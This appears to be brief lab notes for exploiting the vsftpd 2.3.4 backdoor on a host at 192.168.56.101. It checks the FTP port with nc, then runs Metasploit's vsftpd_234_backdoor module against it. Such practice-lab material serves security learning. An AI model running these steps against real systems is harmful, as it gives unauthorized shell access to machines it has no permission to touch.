# vulnerable
# 21/tcp   open  ftp         vsftpd 2.3.4
# confirm we have a target
nc 192.168.56.101 21
# metasploit up
msfconsole

# use exploit/unix/ftp/vsftpd_234_backdoor
# set RHOST 192.168.56.101
# run